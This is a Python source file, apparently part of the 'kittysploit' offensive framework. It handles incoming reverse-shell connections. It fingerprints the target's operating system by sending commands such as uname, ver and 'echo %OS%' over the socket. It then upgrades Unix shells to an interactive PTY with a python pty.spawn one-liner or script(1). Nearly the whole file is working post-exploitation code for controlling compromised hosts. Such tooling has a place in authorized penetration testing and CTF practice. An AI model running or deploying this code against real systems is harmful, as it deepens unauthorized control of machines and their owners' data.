#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""In-band OS probe and PTY upgrade for adaptive reverse-shell listeners.

Detect Unix vs Windows on a live TCP shell socket, then attempt a best-effort
Unix PTY upgrade so classic_shell can enter raw relay.
"""

from __future__ import annotations

import re
import socket
import time
import uuid
from typing import Any, Dict, Optional, Tuple

from lib.shell.pty_runtime import PTY_MAGIC

_UNIX_TOKENS = ("linux", "darwin", "freebsd", "openbsd", "netbsd", "sunos", "aix")
_WIN_TOKENS = ("windows_nt", "microsoft windows", "windows")


def _set_timeout(sock: socket.socket, timeout: Optional[float]) -> Optional[float]:
    old = None
    try:
        old = sock.gettimeout()
    except Exception:
        old = None
    try:
        sock.settimeout(timeout)
    except Exception:
        pass
    return old


def drain_pending(sock: socket.socket, *, max_bytes: int = 65536, idle: float = 0.15) -> bytes:
    """Read and discard (return) any banner / pending bytes without blocking long."""
    buf = bytearray()
    old = _set_timeout(sock, idle)
    try:
        while len(buf) < max_bytes:
            try:
                chunk = sock.recv(4096)
            except (socket.timeout, TimeoutError, BlockingIOError):
                break
            except OSError:
                break
            if not chunk:
                break
            buf.extend(chunk)
            if len(chunk) < 4096:
                # brief second chance for slow banners
                try:
                    sock.settimeout(0.05)
                    more = sock.recv(4096)
                    if more:
                        buf.extend(more)
                except Exception:
                    pass
                break
    finally:
        _set_timeout(sock, old)
    return bytes(buf)


def peek_prefix(sock: socket.socket, max_len: int = 80) -> bytes:
    """Non-destructive peek when MSG_PEEK is available."""
    old = _set_timeout(sock, 0.0)
    try:
        if hasattr(socket, "MSG_PEEK"):
            try:
                return sock.recv(max_len, socket.MSG_PEEK) or b""
            except (BlockingIOError, socket.timeout, TimeoutError, OSError):
                return b""
        return b""
    finally:
        _set_timeout(sock, old)


def _recv_until_marker(
    sock: socket.socket,
    marker: str,
    *,
    timeout: float = 2.5,
    max_bytes: int = 65536,
) -> str:
    deadline = time.time() + max(0.2, float(timeout))
    buf = bytearray()
    marker_b = marker.encode("utf-8", errors="ignore")
    old = _set_timeout(sock, min(0.4, timeout))
    try:
        while time.time() < deadline and len(buf) < max_bytes:
            remaining = deadline - time.time()
            if remaining <= 0:
                break
            try:
                sock.settimeout(min(0.4, remaining))
                chunk = sock.recv(4096)
            except (socket.timeout, TimeoutError, BlockingIOError):
                if marker_b in buf:
                    break
                continue
            except OSError:
                break
            if not chunk:
                break
            buf.extend(chunk)
            if marker_b in buf:
                break
    finally:
        _set_timeout(sock, old)
    text = bytes(buf).decode("utf-8", errors="ignore")
    if marker in text:
        text = text.split(marker, 1)[0]
    return text


def _send_line(sock: socket.socket, line: str, *, newline: str = "\n") -> None:
    sock.sendall((line + newline).encode("utf-8", errors="ignore"))


def exec_probe(
    sock: socket.socket,
    command: str,
    *,
    timeout: float = 2.0,
    newline: str = "\n",
    windows: bool = False,
) -> str:
    """Run a short command and capture output until an echo marker."""
    token = f"KSADAPT{uuid.uuid4().hex[:10]}"
    if windows:
        wrapped = f"{command} & echo {token}"
        nl = "\r\n"
    else:
        # echo is more portable than printf on constrained shells
        wrapped = f"{command}; echo {token}"
        nl = newline
    try:
        _send_line(sock, wrapped, newline=nl)
        return _recv_until_marker(sock, token, timeout=timeout).strip()
    except OSError:
        return ""


def _classify_platform(text: str) -> Optional[str]:
    lower = (text or "").lower()
    for tok in _UNIX_TOKENS:
        if tok in lower:
            if tok == "darwin":
                return "darwin"
            if tok in ("freebsd", "openbsd", "netbsd", "sunos", "aix"):
                return tok
            return "linux"
    for tok in _WIN_TOKENS:
        if tok in lower:
            return "windows"
    # Absolute Unix path banner / prompt crumbs
    if re.search(r"(?m)^/", text or "") and ":\\" not in (text or ""):
        return "linux"
    if re.search(r"[A-Za-z]:\\", text or ""):
        return "windows"
    return None


def probe_os(
    sock: socket.socket,
    *,
    timeout: float = 2.0,
    banner: bytes = b"",
) -> Dict[str, Any]:
    """Best-effort OS detection. Returns platform + shell_hint + raw snippets."""
    result: Dict[str, Any] = {
        "platform": "unknown",
        "shell_hint": "",
        "pty_preexisting": False,
        "method": "none",
        "snippets": {},
    }

    peek = peek_prefix(sock, len(PTY_MAGIC) + 32)
    if peek.startswith(PTY_MAGIC) or (banner or b"").startswith(PTY_MAGIC):
        result["platform"] = "linux"
        result["pty_preexisting"] = True
        result["shell_hint"] = "kittysploit-pty"
        result["method"] = "pty_magic"
        return result

    banner_text = (banner or b"").decode("utf-8", errors="ignore")
    classified = _classify_platform(banner_text)
    if classified:
        result["platform"] = classified
        result["method"] = "banner"
        result["snippets"]["banner"] = banner_text[:200]
        if "powershell" in banner_text.lower() or re.search(r"PS\s+[A-Z]:\\", banner_text):
            result["shell_hint"] = "powershell"
        elif classified == "windows":
            result["shell_hint"] = "cmd"
        else:
            result["shell_hint"] = "sh"
        return result

    # Unix first (most reverse shells in CTF/pentest paths)
    uname = exec_probe(sock, "uname -s 2>/dev/null", timeout=timeout, windows=False)
    result["snippets"]["uname"] = uname[:200]
    classified = _classify_platform(uname)
    if classified and classified != "windows":
        result["platform"] = classified
        result["method"] = "uname"
        result["shell_hint"] = "sh"
        return result

    # Windows probes
    os_env = exec_probe(sock, "echo %OS%", timeout=timeout, windows=True)
    result["snippets"]["echo_os"] = os_env[:200]
    classified = _classify_platform(os_env)
    if classified == "windows":
        result["platform"] = "windows"
        result["method"] = "echo_os"
        result["shell_hint"] = "cmd"
        return result

    ver = exec_probe(sock, "ver", timeout=timeout, windows=True)
    result["snippets"]["ver"] = ver[:200]
    classified = _classify_platform(ver)
    if classified == "windows":
        result["platform"] = "windows"
        result["method"] = "ver"
        result["shell_hint"] = "cmd"
        return result

    # Last resort: pwd vs cd
    pwd = exec_probe(sock, "pwd 2>/dev/null", timeout=min(1.5, timeout), windows=False)
    result["snippets"]["pwd"] = pwd[:200]
    if pwd.startswith("/") and ":\\" not in pwd:
        result["platform"] = "linux"
        result["method"] = "pwd"
        result["shell_hint"] = "sh"
        return result

    return result


def _find_unix_python(sock: socket.socket, *, timeout: float = 2.0) -> str:
    for candidate in ("python3", "python"):
        out = exec_probe(
            sock,
            f"command -v {candidate} 2>/dev/null || which {candidate} 2>/dev/null",
            timeout=timeout,
            windows=False,
        )
        path = (out or "").strip().splitlines()
        if path and path[0].startswith("/") and " " not in path[0]:
            return path[0]
        # Some shells echo the command name only
        if path and candidate in path[0] and "not found" not in path[0].lower():
            return candidate
    return ""


def try_unix_pty_upgrade(
    sock: socket.socket,
    *,
    timeout: float = 3.0,
    shell: str = "/bin/bash",
) -> Dict[str, Any]:
    """Attempt in-band PTY upgrade on a Unix reverse shell.

    Uses python pty.spawn when available, then ``script`` as a fallback.
    Success is best-effort: if the interpreter/tool is present we treat upgrade
    as requested and stamp pty_mode for classic_shell raw relay.
    """
    info: Dict[str, Any] = {
        "pty_upgraded": False,
        "method": "",
        "python": "",
        "shell": "",
        "error": "",
    }
    py = _find_unix_python(sock, timeout=timeout)
    info["python"] = py

    resolved = ""
    for candidate in (shell, "/bin/bash", "/bin/sh"):
        if not candidate:
            continue
        out = exec_probe(
            sock,
            f"test -x {candidate} && echo OK",
            timeout=min(1.5, timeout),
            windows=False,
        )
        if "OK" in (out or ""):
            resolved = candidate
            break
    if not resolved:
        resolved = shell or "/bin/sh"
    info["shell"] = resolved
    shell_lit = resolved.replace("\\", "\\\\").replace('"', '\\"')

    if py:
        # Single-quoted -c payload is safest for typical /bin/sh reverse shells
        upgrade_cmd = (
            f"{py} -c 'import os,pty; os.environ.setdefault(\"TERM\",\"xterm\"); "
            f"pty.spawn(\"{shell_lit}\")'"
        )
        try:
            _send_line(sock, upgrade_cmd, newline="\n")
            # Give the PTY a moment to replace the process image
            time.sleep(0.35)
            drain_pending(sock, idle=0.2)
            info["pty_upgraded"] = True
            info["method"] = "python_pty_spawn"
            return info
        except OSError as exc:
            info["error"] = str(exc)

    # Fallback: script(1) allocates a PTY around a shell
    script_path = exec_probe(
        sock,
        "command -v script 2>/dev/null || which script 2>/dev/null",
        timeout=timeout,
        windows=False,
    ).strip().splitlines()
    if script_path and script_path[0].startswith("/"):
        try:
            _send_line(
                sock,
                f"script -qc 'exec {resolved}' /dev/null 2>/dev/null || "
                f"script -q /dev/null {resolved}",
                newline="\n",
            )
            time.sleep(0.35)
            drain_pending(sock, idle=0.2)
            info["pty_upgraded"] = True
            info["method"] = "script"
            return info
        except OSError as exc:
            info["error"] = str(exc)

    if not info["error"]:
        info["error"] = "no python/script available for PTY upgrade"
    return info


def adapt_connection(
    sock: socket.socket,
    *,
    auto_upgrade: bool = True,
    probe_timeout: float = 2.0,
    upgrade_timeout: float = 3.0,
) -> Tuple[Dict[str, Any], Dict[str, Any]]:
    """Probe + optional upgrade. Returns (session_stamp, caps).

    ``session_stamp`` is safe to merge into listener additional_data.
    """
    banner = drain_pending(sock, idle=0.2)
    probe = probe_os(sock, timeout=probe_timeout, banner=banner)
    platform = str(probe.get("platform") or "unknown")
    pty_upgraded = bool(probe.get("pty_preexisting"))
    upgrade: Dict[str, Any] = {}

    if auto_upgrade and platform in {"linux", "darwin", "freebsd", "openbsd", "netbsd", "unix"} and not pty_upgraded:
        shell = "/bin/bash" if platform in {"linux", "darwin", "unix"} else "/bin/sh"
        upgrade = try_unix_pty_upgrade(sock, timeout=upgrade_timeout, shell=shell)
        pty_upgraded = bool(upgrade.get("pty_upgraded"))

    caps: Dict[str, Any] = {
        "platform": platform,
        "shell_hint": probe.get("shell_hint") or "",
        "pty_upgraded": pty_upgraded,
        "pty_preexisting": bool(probe.get("pty_preexisting")),
        "probe_method": probe.get("method") or "",
        "upgrade_method": (upgrade.get("method") if upgrade else "") or (
            "preexisting" if probe.get("pty_preexisting") else ""
        ),
        "snippets": probe.get("snippets") or {},
        "upgrade": upgrade,
    }

    # Normalize platform labels used across post modules / classic_shell
    platform_norm = platform
    if platform_norm in {"freebsd", "openbsd", "netbsd", "sunos", "aix", "unix"}:
        platform_norm = "linux"
    if platform_norm == "darwin":
        platform_norm = "darwin"

    session_stamp: Dict[str, Any] = {
        "connection_type": "reverse",
        "protocol": "tcp",
        "adaptive": True,
        "adaptive_caps": caps,
        "platform": platform_norm if platform_norm != "unknown" else None,
        "pty_mode": bool(pty_upgraded),
        "stager_line_mode": not bool(pty_upgraded),
    }
    # Drop None platform so we do not overwrite with null
    if session_stamp["platform"] is None:
        session_stamp.pop("platform")

    return session_stamp, caps
